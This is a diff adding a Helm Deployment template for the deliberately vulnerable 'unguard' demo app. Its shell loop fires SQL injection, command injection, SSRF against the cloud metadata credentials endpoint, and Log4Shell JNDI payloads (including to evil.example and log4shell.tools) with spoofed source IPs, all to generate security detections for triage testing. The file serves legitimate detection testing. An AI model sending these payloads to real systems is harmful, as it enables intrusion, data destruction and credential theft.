@@ -1,0 +1,199 @@
+{{- /*
+Copyright 2023 Dynatrace LLC
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/}}
+{{ if .Values.detectionStream.enabled }}
+# Detection Stream Generator
+# Runs the unguard attack battery (SQLi across Java/.NET/Go/PHP/Node services, CMDi,
+# SSRF, JNDI/Log4Shell) in a jittered loop as a long-running Deployment, producing a
+# *continuous* stream of RAP DETECTION_FINDINGs. Unlike attackSimulator (a periodic
+# CronJob), a Deployment self-heals across the nightly/weekend node scale-down
+# (desired 0 <-> N): when nodes are gone the single pod is simply unschedulable, so
+# no Job backlog accumulates and there is no thundering herd when the cluster scales
+# back up - the pod resumes on its own.
+#
+# Richness levers (see chart/README.md "Generating a Continuous Stream ..."):
+#   * ATTACKER_IPS + X-Forwarded-For/X-Real-IP  -> spreads actor.ips so detections
+#     attribute to several source IPs and recur per persona (campaign/recurrence
+#     ranking in queue-level triage; non-trivial IOC hunts). IPs are the geo-varied
+#     pool unguard's own malicious-load-generator uses.
+#   * .NET / Go / PHP / Node legs -> detections land on several process groups and
+#     languages, spreading risk level and entity type across the triage queue.
+#   * MISDIRECT_CHANCE -> occasionally fires an attack at a service NOT vulnerable to
+#     it (e.g. a JNDI string at the .NET membership field). RAP still flags the
+#     attempt, but there is no matching vulnerable library on that entity, so triage's
+#     exploited<->vulnerable evidence leg yields a de-prioritize verdict. Gives the
+#     queue clear low-priority / false-positive-looking candidates to discriminate.
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: unguard-{{ .Values.detectionStream.name }}
+  labels:
+    app.kubernetes.io/name: {{ .Values.detectionStream.name }}
+    app.kubernetes.io/part-of: unguard
+{{ include "renderLabels" .Values.labels.common | indent 4 }}
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: {{ .Values.detectionStream.name }}
+      app.kubernetes.io/part-of: unguard
+  strategy:
+    type: Recreate
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: {{ .Values.detectionStream.name }}
+        app.kubernetes.io/part-of: unguard
+{{ include "renderLabels" .Values.labels.common | indent 8 }}
+    spec:
+      terminationGracePeriodSeconds: 5
+      restartPolicy: Always
+      initContainers:
+        - name: wait-for-frontend
+          image: curlimages/curl
+          command: ["/bin/sh", "-c"]
+          args: ['while [ $(curl -ksw "%{http_code}" "http://unguard-frontend:80/ui/api/healthz" -o /dev/null) -ne 200 ]; do sleep 5; echo "health check failed. Waiting for the frontend..."; done']
+      containers:
+        - name: {{ .Values.detectionStream.name }}
+          image: {{ .Values.detectionStream.image.repository }}:{{ .Values.detectionStream.image.tag }}
+          imagePullPolicy: {{ .Values.detectionStream.image.pullPolicy }}
+          env:
+            - name: FRONTEND_ADDR
+              value: {{ quote .Values.detectionStream.frontendAddr }}
+            - name: JNDI_ENDPOINT
+              value: {{ quote .Values.detectionStream.jndiEndpoint }}
+            - name: ATTACKER_USERS
+              value: {{ quote .Values.detectionStream.attackerUsers }}
+            - name: ATTACKER_IPS
+              value: {{ quote .Values.detectionStream.attackerIps }}
+            - name: MIN_SLEEP
+              value: {{ quote .Values.detectionStream.minSleep }}
+            - name: MAX_SLEEP
+              value: {{ quote .Values.detectionStream.maxSleep }}
+            - name: ATTACK_CHANCE
+              value: {{ quote .Values.detectionStream.attackChancePercent }}
+            - name: MISDIRECT_CHANCE
+              value: {{ quote .Values.detectionStream.misdirectChancePercent }}
+          resources:
+            requests:
+              cpu: {{ quote .Values.detectionStream.resources.requests.cpu }}
+              memory: {{ quote .Values.detectionStream.resources.requests.memory }}
+            limits:
+              cpu: {{ quote .Values.detectionStream.resources.limits.cpu }}
+              memory: {{ quote .Values.detectionStream.resources.limits.memory }}
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              set -u
+              COOKIE_JAR=/tmp/cookies
+
+              # 16-bit unsigned int from the kernel CSPRNG (ash has no $RANDOM).
+              rnd() { od -An -N2 -tu2 /dev/urandom | tr -d ' \n'; }
+              rand_range() { _lo=$1; _hi=$2; echo $(( _lo + $(rnd) % (_hi - _lo + 1) )); }
+              # true CHANCE% of the time.
+              chance() { [ "$(( $(rnd) % 100 ))" -lt "$1" ]; }
+              maybe() { chance "$ATTACK_CHANCE"; }
+              # nth <index> <word...> -> the index-th word (1-based). Args-only, so it is
+              # safe inside command substitution (no cross-subshell variable reliance).
+              nth() { _i="$1"; shift; eval echo "\${$_i}"; }
+
+              login() {
+                _u="$1"
+                curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/auth/register" \
+                  -H 'Content-Type: application/json' \
+                  -d "{\"username\":\"$_u\",\"password\":\"$_u\"}"
+                curl -s -c "$COOKIE_JAR" -o /dev/null -X POST "http://$FRONTEND_ADDR/api/auth/login" \
+                  -H 'Content-Type: application/json' \
+                  -d "{\"username\":\"$_u\",\"password\":\"$_u\"}"
+                grep -q jwt "$COOKIE_JAR"
+              }
+
+              echo "=== detection-stream started @ $(date) frontend=$FRONTEND_ADDR ==="
+              echo "    users=[$ATTACKER_USERS] ips=[$ATTACKER_IPS]"
+              echo "    sleep=${MIN_SLEEP}-${MAX_SLEEP}s chance=${ATTACK_CHANCE}% misdirect=${MISDIRECT_CHANCE}%"
+
+              while true; do
+                # Persona index in the CURRENT shell so the IP can bind to it. 80% of the
+                # time the persona uses its aligned IP slot (recurring actor); otherwise a
+                # random pool IP (distributed spread).
+                set -- $ATTACKER_USERS; NUSERS=$#
+                PIDX=$(( $(rnd) % NUSERS + 1 ))
+                U="$(nth "$PIDX" $ATTACKER_USERS)"
+                set -- $ATTACKER_IPS; NIPS=$#
+                if [ "$NIPS" -ge "$PIDX" ] && [ "$(( $(rnd) % 100 ))" -lt 80 ]; then IPIDX="$PIDX"; else IPIDX=$(( $(rnd) % NIPS + 1 )); fi
+                IP="$(nth "$IPIDX" $ATTACKER_IPS)"
+                # Every attack carries the same spoofed client IP for this pass so RAP
+                # attributes it to the persona's source; XFF and X-Real-IP cover both
+                # proxy conventions.
+                XF="X-Forwarded-For: $IP"
+                XR="X-Real-IP: $IP"
+                if login "$U"; then
+                  n=0
+                  # 1. SQLi -> profile-service (Java, H2 bio UPDATE)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/user/$U/bio" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"bioText":"'"'"' WHERE 1=0; SELECT H2VERSION(); --","enableMarkdown":false}'; fi
+                  # 2. CMDi -> profile-service (markdown sh -c)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/user/$U/bio" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"bioText":"'"'"'; id; uname -a; #","enableMarkdown":true}'; fi
+                  # 3. CMDi -> proxy-service (image url curl)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/post" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"imageUrl":"example.com && id && whoami #","content":"cmdi-proxy-demo"}'; fi
+                  # 4. SSRF -> proxy-service (share-url HttpClient)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/post" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","content":"ssrf-demo"}'; fi
+                  # 5. SQLi auth bypass -> user-auth-service (Node.js)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/auth/login" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" \
+                    -d '{"username":"admin\" OR 1=0 UNION ALL SELECT \"user\",\"$2a$10$MolvAKiEajLTuAN2HtaR/O.6h8wGhl3/UPn4WUCZ4sCAtbngzWgfy\",1 FROM DUAL #","password":"password"}'; fi
+                  # 6. JNDI -> microblog-service (Java, Log4Shell)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/post" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"content":"log4shell-demo ${jndi:ldap://log4shell.tools:1389/unguard-demo}","imageUrl":"'"$JNDI_ENDPOINT"'"}'; fi
+                  # 7. SQLi -> membership-service (.NET, MariaDB UPDATE). Payload kept in a
+                  #    var so its single quotes don't collide with the JSON double quotes.
+                  if maybe; then n=$((n+1)); MEMB="PRO; UPDATE membership SET membership='hacked' WHERE 1=1 -- "; \
+                    curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/user/$U/membership" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d "{\"membership\":\"$MEMB\"}"; fi
+                  # 8. SQLi -> status-service (Go, user list GET). -G --data-urlencode so the
+                  #    payload is encoded into the query string safely.
+                  if maybe; then n=$((n+1)); SQLU="' UNION SELECT id+1000, username, password_hash FROM users;--"; \
+                    curl -s -o /dev/null -G "http://$FRONTEND_ADDR/api/users" \
+                    -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    --data-urlencode "name=$SQLU" --data-urlencode "roles="; fi
+                  # 9. SQLi -> like-service (PHP, MariaDB DELETE via postId param)
+                  if maybe; then n=$((n+1)); curl -s -o /dev/null -X DELETE -G "http://$FRONTEND_ADDR/api/like" \
+                    -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    --data-urlencode "postId=1 OR 1=1" --data-urlencode "postId=1"; fi
+                  # 10. MISDIRECTED: JNDI string aimed at the .NET membership field (no log4j
+                  #     there). RAP flags the injection attempt but the exploited<->vulnerable
+                  #     correlation finds nothing -> a clean de-prioritize candidate for triage.
+                  if chance "$MISDIRECT_CHANCE"; then n=$((n+1)); \
+                    curl -s -o /dev/null -X POST "http://$FRONTEND_ADDR/api/user/$U/membership" \
+                    -H 'Content-Type: application/json' -H "$XF" -H "$XR" -b "$COOKIE_JAR" \
+                    -d '{"membership":"PRO ${jndi:ldap://evil.example/x}"}'; fi
+                  echo "[$(date +%H:%M:%S)] actor=$U src=$IP dispatched $n attack(s)"
+                else
+                  echo "[$(date +%H:%M:%S)] login failed for $U; retrying"
+                fi
+                S="$(rand_range "$MIN_SLEEP" "$MAX_SLEEP")"
+                echo "[$(date +%H:%M:%S)] sleeping ${S}s"
+                sleep "$S"
+              done
+{{ end }}
